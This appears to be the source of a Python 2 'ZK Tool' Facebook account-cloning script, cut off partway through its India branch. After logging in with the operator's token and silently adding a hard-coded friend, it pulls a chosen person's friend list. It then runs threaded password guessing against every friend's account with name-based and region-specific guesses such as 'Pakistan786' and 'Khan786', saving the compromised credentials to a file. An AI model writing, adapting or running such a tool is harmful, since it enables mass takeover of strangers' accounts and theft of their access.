#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
    print "\033[1;91m[!] \x1b[1;91mExit"
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(00000.1)


##### LOGOS #####
logo = """
\033[1;91m           ______ _   __  _____           _ 
\033[1;91m          |___  /| | / / |_   _|         | |
\033[1;91m             / / | |/ /    | | ___   ___ | |
\033[1;91m            / /  |    \    | |/ _ \ / _ \| |
\033[1;91m          ./ /___| |\  \   | | (_) | (_) | |
\033[1;91m          \_____/\_| \_/   \_/\___/ \___/|_|
                                     
"""                                  
logo1 = """

\033[1;91m              ___  ___                 
\033[1;91m              |  \/  |                 
\033[1;91m              | .  . | ___ _ __  _   _ 
\033[1;91m              | |\/| |/ _ \ '_ \| | | |
\033[1;91m              | |  | |  __/ | | | |_| |
\033[1;91m              \_|  |_/\___|_| |_|\__,_|                              
                                                         
"""

logo2 = """
\033[1;91m        ______     _    _     _              
\033[1;91m        | ___ \   | |  (_)   | |             
\033[1;91m        | |_/ /_ _| | ___ ___| |_ __ _ _ __  
\033[1;91m        |  __/ _` | |/ / / __| __/ _` | '_ \ 
\033[1;91m        | | | (_| |   <| \__ \ || (_| | | | |
\033[1;91m        \_|  \__,_|_|\_\_|___/\__\__,_|_| |_|
                                     
"""

logo3 = """
 
\033[1;91m             _____           _ _       
\033[1;91m            |_   _|         | (_)      
\033[1;91m              | |  _ __   __| |_  __ _ 
\033[1;91m              | | | '_ \ / _` | |/ _` |
\033[1;91m             _| |_| | | | (_| | | (_| |
\033[1;91m            |_____|_| |_|\__,_|_|\__,_|
                            
"""

logo4 = """

\033[1;91m           _____           _       
\033[1;91m           |_   _|         | |      
\033[1;91m             | |  _ __   __| | ___  
\033[1;91m             | | | '_ \ / _` |/ _ \ 
\033[1;91m            _| |_| | | | (_| | (_) |      
\033[1;91m           |_____|_| |_|\__,_|\___/.nesia       
                                                          
                                                   
"""
logo5 = """

\033[1;91m        __  __       _                 _        
\033[1;91m        |  \/  |     | |               (_)       
\033[1;91m        | \  / | __ _| | __ _ _   _ ___ _  __ _  
\033[1;91m        | |\/| |/ _` | |/ _` | | | / __| |/ _` | 
\033[1;91m        | |  | | (_| | | (_| | |_| \__ \ | (_| | 
\033[1;91m        |_|  |_|\__,_|_|\__,_|\__, |___/_|\__,_| 
\033[1;91m                               __/ |             
\033[1;91m                              |___/              


"""

logo6 = """
                                    
\033[1;91m                    /\   | | |
\033[1;91m                   /  \  | | |
\033[1;91m                  / /\ \ | | |
\033[1;91m                 / ____ \| | |
\033[1;91m                /_/    \_\_|_|
               
"""



def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        print("\r\x1b[1;92mPlease Wait \x1b[1;92m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """

\033[1;94m              ______      _     _     _ 
\033[1;96m             |___  /     | |   (_)   | |
\033[1;95m                / /  __ _| |__  _  __| |
\033[1;90m               / /  / _` | '_ \| |/ _` |
\033[1;93m             ./ /__| (_| | | | | | (_| |
\033[1;91m             \_____/\__,_|_| |_|_|\__,_|
  
\033[1;91m   ╔════════════════════════════════════════════╗
\033[1;91m   ‖                                            ‖
\033[1;91m   ‖Github:  https://github.com/ZahidMahmood786 ‖
\033[1;91m   ‖                                            ‖
\033[1;91m   ‖Youtube: https://m.youtube.com/ZeeKTricks   ‖
\033[1;91m   ‖                                            ‖
\033[1;91m   ╚════════════════════════════════════════════╝
                                                                     
"""

CorrectPasscode = "6545"
jalan(" 🔒🔒🔒 4 Digit PassCode Required To Enter 🔒🔒🔒")

loop = 'true'
while (loop == 'true'):
    passcode = raw_input("\033[1;97m[🔒] \x1b[1;97mEnter PassCode\x1b[1;97m: ")
    if (passcode == CorrectPasscode):
            print """
            \033[1;92m🔓🔓🔓Correct Entry✅✅✅
                  """
            jalan("     •◈•────•◈•Welcome To ZK Tool•◈•────•◈•")
            loop = 'false'
    else:
            print "\033[1;91m🔒🔒🔒Wrong Entry!"
            os.system('xdg-open https://www.youtube.com/cannel/UCNx68447zLAljb_UoAqbUNA')

def login():
    os.system('clear')
    try:
        toket = open('login.txt','r')
        menu() 
    except (KeyError,IOError):
        os.system('clear')
        print logo
        jalan("\033[1;90m")

        print('\033[1;92m[◉] \x1b[1;92mLogin Your Facebook Account \033[1;92m' )
        id = raw_input('\033[1;92m[◉] \033[1;92mID/Email \x1b[1;92m: \x1b[1;97m' )
        pwd = raw_input('\033[1;92m[◉] \033[1;92mPassword \x1b[1;92m: \x1b[1;97m' )
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print"\n\033[1;91m[!] \x1b[1;91mThere is no internet connection"
            keluar()
        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:

                sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
                x=hashlib.new("md5")
                x.update(sig)
                a=x.hexdigest()
                data.update({'sig':a})
                url = "https://api.facebook.com/restserver.php"
                r=requests.get(url,params=data)
                z=json.loads(r.text)
                unikers = open("login.txt", 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[1;32;40m[✅] Login Successful✅✅✅'
                os.system('xdg-open https://www.youtube.com/cannel/UCNx68447zLAljb_UoAqbUNA')
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
                menu()
            except requests.exceptions.ConnectionError:
                print"\n\033[1;97m[!] There is no internet connection"
                keluar()
        if 'checkpoint' in url:
            print("\n\033[1;94m[!] Your Account is on Checkpoint")
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print("\n\033[1;91mPassword Or Email is wrong!")
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()

def menu():
    os.system('clear')
    try:
        toket=open('login.txt','r').read()
    except IOError:
        os.system('clear')
        print"\033[1;97m[!] Token invalid"
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
        ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
        b = json.loads(ots.text)
        sub = str(b['summary']['total_count'])
    except KeyError:
        os.system('clear')
        print"\033[1;97mYour Account is on Checkpoint"
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print"\033[1;97mThere is no internet connection"
        keluar()
    os.system("clear")
    print logo
    print "    \033[1;31;40m◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈"
    print "    \033[1;31;40m◈\033[1;32;40m[✅] Name \033[1;32;40m  : "+nama+"        "                               
    print "    \033[1;31;40m◈\033[1;32;40m[✅] Id No\033[1;32;40m  : "+id+"          "
    print "    \033[1;31;40m◈\033[1;32;40m[✅] Friends\033[1;32;40m: "+sub+"         "        
    print "    \033[1;31;40m◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈"
    print("\033[1;35;40m[1] \033[1;35;40mStart Cloning Process")
    print("\033[1;35;40m[2] \033[1;35;40mUpdate Tool")                                                                                                                      
    print("\033[1;35;40m[0] \033[1;35;40mLog out") 
    pilih()

def pilih():
    unikers = raw_input("        \n\033[1;37;40mChoose An Option: \033[1;37;40m")
    if unikers =="":
        print "\033[1;97mFill in correctly"
        pilih()
    elif unikers =="1":
        super()
    elif unikers =="2":
        os.system('clear')
        os.system('git pull origin master')
        raw_input('\n\033[1;97m[ \033[1;97mBack \033[1;97m]')
        menu()
    elif unikers =="0":
        jalan("\033[1;91m..........Logging Out..........")
        print "\033[1;92mLogged Out Successfully✅✅✅"
        os.system('rm -rf login.txt')
        keluar()
    else:
        print "\033[1;97mFill in correctly"
        pilih()

def super():
    global toket
    os.system('clear')
    try:
        toket=open('login.txt','r').read()
    except IOError:
        print"\033[1;97mToken invalid"
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    os.system('clear')
    print logo1
    print("\x1b[1;35;40m[1] \033[1;35;40mAll  Countries   Accounts Clone")
    print("\x1b[1;35;40m[2] \033[1;35;40mOnly Pakistanis  Accounts Clone")
    print("\x1b[1;35;40m[3] \033[1;35;40mOnly Indian      Accounts Clone")
    print("\x1b[1;35;40m[4] \033[1;35;40mOnly Indonesian  Accounts Clone")
    print("\x1b[1;35;40m[5] \033[1;35;40mOnly Malaysian   Accounts Clone")
    print("\x1b[1;35;40m[0] \033[1;35;40mBack")
    pilih_super()

def pilih_super():
    peak = raw_input("\n\033[1;37;40mChoose An Option: \033[1;97m")
    if peak =="":
        print "\033[1;97mFill in correctly"
        pilih_super()
    
    elif peak =="1":
        os.system('clear')
        print logo6
        idt = raw_input("\033[1;97m[◉] Enter ID : ")
        try:
            jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
            op = json.loads(jok.text)
            print"\033[1;34;40m[●] Name : "+op["name"]
        except KeyError:
            print"\033[1;97m[◉] ID Not Found!"
            raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
            super()
        jalan("\033[1;34;40m[◉] Reading IDs...")
        r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
    elif peak =="2":
        pakistan()
    elif peak =="3":
        india()
    elif peak =="4":
        indonesia()
    elif peak =="5":
        malaysia()
    
    elif peak =="0":
        menu()
    else:
        print "\033[1;97mFill in correctly"
        pilih_super()

    print "\033[1;34;40m[◈] Total Fetched IDs : \033[1;97m"+str(len(id))
    jalan('\033[1;34;40m[◈] Please Wait...')
    jalan("\r\033[1;32;40m•◈•─•◈• Cloning Process Has Been Started...•◈•─•◈•\033[1;97m")
    jalan("\033[1;92m•◈─•◈•   To Stop The Process Press CTRl+Z...•◈─•◈•")
    jalan("\033[1;91m| Status| |      Id No      |  Password |")


    def main(arg):
        global cekpoint,oks
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass 
        try:
            a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '786'
            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
            q = json.load(data)
            if 'access_token' in q:
                print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \033[1;92m | \033[1;972 ' + pass1
                oks.append(user+pass1)
            else:
                if 'www.facebook.com' in q["error_msg"]:
                    print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass1
                    cek = open("out/CP.txt", "a")
                    cek.write(user+"|"+pass1+"\n")
                    cek.close()
                    cekpoint.append(user+pass1)
                else:
                    pass2 = b['first_name'] + '123'
                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \033[1;92m | \033[1;972 ' + pass2
                        oks.append(user+pass2)
                    else:
                        if 'www.facebook.com' in q["error_msg"]:
                            print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass2
                            cek = open("out/CP.txt", "a")
                            cek.write(user+"|"+pass2+"\n")
                            cek.close()
                            cekpoint.append(user+pass2)
                        else:
                            pass3 = b['first_name'] + '12345'
                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \033[1;92m | \033[1;972 ' + pass3
                                oks.append(user+pass3)
                            else:
                                if 'www.facebook.com' in q["error_msg"]:
                                    print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass3
                                    cek = open("out/CP.txt", "a")
                                    cek.write(user+"|"+pass3+"\n")
                                    cek.close()
                                    cekpoint.append(user+pass4)
                                else:
                                    pass4 = b['first_name'] + '1234'
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \033[1;92m | \033[1;972 ' + pass4
                                        oks.append(user+pass4)
                                    else:
                                        if 'www.facebook.com' in q["error_msg"]:
                                            print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass4
                                            cek = open("out/CP.txt", "a")
                                            cek.write(user+"|"+pass4+"\n")
                                            cek.close()
                                            cekpoint.append(user+pass4)
                                        else:
                                            pass5 = '786786'
                                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \x1b[1;32;40m|\033[1;92m ' + pass5
                                                oks.append(user+pass5)
                                            else:
                                                if 'www.facebook.com' in q["error_msg"]:
                                                    print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass5
                                                    cek = open("out/CP.txt", "a")
                                                    cek.write(user+"|"+pass5+"\n")
                                                    cek.close()
                                                    cekpoint.append(user+pass5)
                                                else:
                                                    pass6 = b['last_name'] + '123'
                                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                    q = json.load(data)
                                                    if 'access_token' in q:
                                                        print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \x1b[1;32;40m|\033[1;92m ' + pass6
                                                        oks.append(user+pass6)
                                                    else:
                                                        if 'www.facebook.com' in q["error_msg"]:
                                                            print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass6
                                                            cek = open("out/CP.txt", "a")
                                                            cek.write(user+"|"+pass6+"\n")
                                                            cek.close()
                                                            cekpoint.append(user+pass6)
                                                        else:
                                                            pass7 = 'Pakistan'
                                                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                            q = json.load(data)
                                                            if 'access_token' in q:
                                                                print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \x1b[1;32;40m|\033[1;92m ' + pass7
                                                                oks.append(user+pass7)
                                                            else:
                                                                if 'www.facebook.com' in q["error_msg"]:
                                                                    print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass7
                                                                    cek = open("out/CP.txt", "a")
                                                                    cek.write(user+"|"+pass7+"\n")
                                                                    cek.close()
                                                                    cekpoint.append(user+pass7)
                                                                
        except:                                                                     
            pass
        
    p = ThreadPool(30)
    p.map(main, id) 
    
    print '\033[1;31;40m[✅] Process Has Been Completed✅✅✅\033[1;97m'
    print "\033[1;32;40m[✅] Total OK/\033[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;31;40m/\033[1;33;40m"+str(len(cekpoint))
    print '\033[1;34;40m[✅] Cloned Accounts Has Been Saved : save/cp.txt'
    jalan("  \033[1;32;40m•◈•────•◈•Thanks For Using ZK Tool•◈•────•◈•")
    
    raw_input("\n\033[1;91m[\033[1;91mExit\033[1;91m]")
    super()

def pakistan():
    global toket
    os.system('clear')
    try:
        toket=open('login.txt','r').read()
    except IOError:
        print"\x1b[1;94mToken invalid"
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    os.system('clear')
    print logo2
    print "\033[1;93m[1] \x1b[1;93mClone Pakistani Friend List Accounts."
    time.sleep(0.05)
    print "\033[1;91m[0] \033[1;91mBack"
    pilih_pakistan()

def pilih_pakistan():
    peak = raw_input("\n\033[1;37;40mChoose An Option: \033[1;97m")
    if peak =="":
        print "\033[1;97mFill in correctly"
        pilih_pakistan()
    elif peak =="1":
        os.system('clear')
        print logo2
        idt = raw_input("\033[1;97m[◉] Enter ID : ")
        try:
            jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
            op = json.loads(jok.text)
            print"\033[1;34;40m[●] Name : "+op["name"]
        except KeyError:
            print"\033[1;97m[◉] ID Not Found!"
            raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
            pakistan()
        jalan("\033[1;34;40m[◉] Reading IDs...")
        r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
    elif peak =="0":
        super()
    else:
        print "\x1b[1;91mFill in correctly"
        pilih_pakistan()
    
    print "\033[1;34;40m[◈] Total Fetched IDs : \033[1;97m"+str(len(id))
    jalan('\033[1;34;40m[◈] Please Wait...')
    jalan("\r\033[1;32;40m•◈•─•◈• Cloning Process Has Been Started...•◈•─•◈•\033[1;97m")
    jalan("\033[1;92m•◈─•◈•   To Stop The Process Press CTRl+Z...•◈─•◈•")
    jalan("\033[1;91m| Status| |      Id No      |  Password |")

    
    def main(arg):
        global cekpoint,oks
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass 
        try:
            a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
            b = json.loads(a.text)
            pass1 =  'Pakistan786'
            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
            q = json.load(data)
            if 'access_token' in q:
                print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \033[1;92m | \033[1;972 ' + pass1
                oks.append(user+pass1)
            else:
                if 'www.facebook.com' in q["error_msg"]:
                    print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass1
                    cek = open("out/CP.txt", "a")
                    cek.write(user+"|"+pass1+"\n")
                    cek.close()
                    cekpoint.append(user+pass1)
                else:
                    pass2 = b['first_name'] + '123'
                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \033[1;92m | \033[1;972 ' + pass2
                        oks.append(user+pass2)
                    else:
                        if 'www.facebook.com' in q["error_msg"]:
                            print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass2
                            cek = open("out/CP.txt", "a")
                            cek.write(user+"|"+pass2+"\n")
                            cek.close()
                            cekpoint.append(user+pass2)
                        else:
                            pass3 = b['first_name'] + '12345'
                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \033[1;92m | \033[1;972 ' + pass3
                                oks.append(user+pass3)
                            else:
                                if 'www.facebook.com' in q["error_msg"]:
                                    print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass3
                                    cek = open("out/CP.txt", "a")
                                    cek.write(user+"|"+pass3+"\n")
                                    cek.close()
                                    cekpoint.append(user+pass4)
                                else:
                                    pass4 = b['first_name'] + '1234'
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \033[1;92m | \033[1;972 ' + pass4
                                        oks.append(user+pass4)
                                    else:
                                        if 'www.facebook.com' in q["error_msg"]:
                                            print '\x1b[1;33;40m[Offline] \033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass4
                                            cek = open("out/CP.txt", "a")
                                            cek.write(user+"|"+pass4+"\n")
                                            cek.close()
                                            cekpoint.append(user+pass4)
                                        else:
                                            pass5 = '786786'
                                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \x1b[1;32;40m|\033[1;92m ' + pass5
                                                oks.append(user+pass5)
                                            else:
                                                if 'www.facebook.com' in q["error_msg"]:
                                                    print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass5
                                                    cek = open("out/CP.txt", "a")
                                                    cek.write(user+"|"+pass5+"\n")
                                                    cek.close()
                                                    cekpoint.append(user+pass5)
                                                else:
                                                    pass6 = 'Khan786'
                                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                    q = json.load(data)
                                                    if 'access_token' in q:
                                                        print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \x1b[1;32;40m|\033[1;92m ' + pass6
                                                        oks.append(user+pass6)
                                                    else:
                                                        if 'www.facebook.com' in q["error_msg"]:
                                                            print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass6
                                                            cek = open("out/CP.txt", "a")
                                                            cek.write(user+"|"+pass6+"\n")
                                                            cek.close()
                                                            cekpoint.append(user+pass6)
                                                        else:
                                                            pass7 = 'Pakistan'
                                                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                            q = json.load(data)
                                                            if 'access_token' in q:
                                                                print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \x1b[1;32;40m|\033[1;92m ' + pass7
                                                                oks.append(user+pass7)                                                            
                                                            else:
                                                                if 'www.facebook.com' in q["error_msg"]:
                                                                    print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass7
                                                                    cek = open("out/CP.txt", "a")
                                                                    cek.write(user+"|"+pass7+"\n")
                                                                    cek.close()
                                                                    cekpoint.append(user+pass7)
        except:                                                                     
            pass
        
    p = ThreadPool(30)
    p.map(main, id) 
    
    print '\033[1;31;40m[✅] Process Has Been Completed✅✅✅\033[1;97m'
    print "\033[1;32;40m[✅] Total OK/\033[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;31;40m/\033[1;33;40m"+str(len(cekpoint))
    print '\033[1;34;40m[✅] Cloned Accounts Has Been Saved : save/cp.txt'
    jalan("  \033[1;32;40m•◈•────•◈•Thanks For Using ZK Tool•◈•────•◈•")
    
    raw_input("\n\033[1;91m[\033[1;91mExit\033[1;91m]")
    pakistan()
    
def india():
    global toket
    os.system('clear')
    try:
        toket=open('login.txt','r').read()
    except IOError:
        print"\x1b[1;94mToken invalid"
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    os.system('clear')
    print logo3
    print"\033[1;93m[1] \x1b[1;93mClone Indian Friend List Accounts."
    time.sleep(0.05)
    print "\033[1;91m[0] \033[1;91mBack"
    pilih_india()

def pilih_india():
    peak = raw_input("\n\033[1;37;40mChoose An Option: \033[1;97m")
    if peak =="":
        print "\033[1;97mFill in correctly"
        pilih_india()
    elif peak =="1":
        os.system('clear')
        print logo3
        idt = raw_input("\033[1;97m[◉] Enter ID : ")
        try:
            jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
            op = json.loads(jok.text)
            print"\033[1;34;40m[●] Name : "+op["name"]
        except KeyError:
            print"\033[1;97m[◉] ID Not Found!"
            raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
            india()
        jalan("\033[1;34;40m[◉] Reading IDs...")
        r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
    elif peak =="0":
        super()
    else:
        print "\x1b[1;91mFill in correctly"
        pilih_india()
    
    print "\033[1;34;40m[◈] Total Fetched IDs : \033[1;97m"+str(len(id))
    jalan('\033[1;34;40m[◈] Please Wait...')
    jalan("\r\033[1;32;40m•◈•─•◈• Cloning Process Has Been Started...•◈•─•◈•\033[1;97m")
    jalan("\033[1;92m•◈─•◈•   To Stop The Process Press CTRl+Z...•◈─•◈•")
    jalan("\033[1;91m| Status| |      Id No      |  Password |")



    def main(arg):
        global cekpoint,oks
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass 
        try:
            a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + 'Verma'
            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
            q = json.load(data)
            if 'access_token' in q:
                print '\033[1;92m[Online] |\033[1;92m ' + user  + ' \033[1;92m | \033[1;972 ' + pass1
                oks.append(user+pass1)
            else:
                if 'www.facebook.com' in q["error_msg"]:
                    print '\x1b[1;33;40m[Offline] |\033[1;93m ' + user  + ' \x1b[1;33;40m|\033[1;93m ' + pass1
                    cek = open("out/CP.txt", "a")
                    cek.write(user+"|"+pass1+"\n")
                    cek.close()
                    cekpoint.append(user+pass1)
                else:
                    pass2 = b['first_name'] + '123'
